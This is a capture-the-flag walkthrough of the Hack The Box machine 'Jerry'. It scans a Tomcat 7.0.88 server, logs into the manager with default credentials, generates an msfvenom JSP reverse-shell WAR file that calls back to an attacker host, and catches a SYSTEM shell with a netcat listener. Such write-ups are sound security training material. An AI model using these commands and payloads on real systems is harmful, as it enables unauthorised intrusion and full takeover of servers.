# Hackthebox Jerry

## Enumeration

First do the standard portscanning of every tcp port on the system.

```
$ sudo nmap -A -T4 -p- 10.129.228.238
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-01 08:57 EST
Nmap scan report for 10.129.228.238
Host is up (0.033s latency).
Not shown: 65534 filtered ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2012 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 7 Professional (87%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
```

Directory scanning

```
$ gobuster dir -u http://10.129.228.238:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50          1 ⨯
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.228.238:8080
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/01/01 09:09:51 Starting gobuster in directory enumeration mode
===============================================================
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/manager              (Status: 302) [Size: 0] [--> /manager/] 
/con                  (Status: 200) [Size: 0]                 
/http%3A%2F%2Fwww     (Status: 400) [Size: 0]                 
/http%3A%2F%2Fyoutube (Status: 400) [Size: 0]                 
/http%3A%2F%2Fblogs   (Status: 400) [Size: 0]                 
/http%3A%2F%2Fblog    (Status: 400) [Size: 0]                 
/**http%3A%2F%2Fwww   (Status: 400) [Size: 0]                 
/External%5CX-News    (Status: 400) [Size: 0]                 
/http%3A%2F%2Fcommunity (Status: 400) [Size: 0]               
/http%3A%2F%2Fradar   (Status: 400) [Size: 0]                 
/http%3A%2F%2Fjeremiahgrossman (Status: 400) [Size: 0]        
/http%3A%2F%2Fweblog  (Status: 400) [Size: 0]                 
/http%3A%2F%2Fswik    (Status: 400) [Size: 0]                 
```

Opening url /manager asks username and password for "Tomcat Manager Application". By canceling the pop up window a default page comes up with an example username and password. Logging in with these example credentials actually works and we are greeted by the Tomcat Web Application Manager dashboard.

Server status page reveals we have Apache Tomcat/7.0.88.

## Vulnerability scanning

Nikto shows us a bunch of vulnerabilities, including the default credentials.

```
$ nikto -h 10.129.228.238:8080
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.129.228.238
+ Target Hostname:    10.129.228.238
+ Target Port:        8080
+ Start Time:         2022-01-01 09:15:06 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache-Coyote/1.1
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-39272: /favicon.ico file identifies this app/server as: Apache Tomcat (possibly 5.5.26 through 8.0.15), Alfresco Community
+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
+ Default account found for 'Tomcat Manager Application' at /manager/html (ID 'tomcat', PW 's3cret'). Apache Tomcat.
+ /host-manager/html: Default Tomcat Manager / Host Manager interface found
+ /manager/html: Tomcat Manager / Host Manager interface found (pass protected)
+ /manager/status: Tomcat Server Status interface found (pass protected)
+ 8020 requests: 0 error(s) and 14 item(s) reported on remote host
+ End Time:           2022-01-01 09:20:34 (GMT-5) (328 seconds)
---------------------------------------------------------------------------
```

Also, as have admin access to the application manager, we can leverage WAR-upload vulnerability.

## Initial Access

### WAR-upload

Generate a reverse shell

```
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.23 LPORT=4444 -f war -o revshell.war
Payload size: 1096 bytes
Final size of war file: 1096 bytes
Saved as: revshell.war
```

Set up a listener, upload revshell.war using the application manager, and execute it using the application manager.

```
$ nc -nvlp 4444               
listening on [any] 4444 ...
connect to [10.10.14.23] from (UNKNOWN) [10.129.228.238] 49192
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system
```

And capture the flags, easy one as we got a root level straight away

```
C:\apache-tomcat-7.0.88>dir ..\Users\Administrator\Desktop\flags
dir ..\Users\Administrator\Desktop\flags
 Volume in drive C has no label.
 Volume Serial Number is FC2B-E489

 Directory of C:\Users\Administrator\Desktop\flags

06/19/2018  06:09 AM    <DIR>          .
06/19/2018  06:09 AM    <DIR>          ..
06/19/2018  06:11 AM                88 2 for the price of 1.txt
```




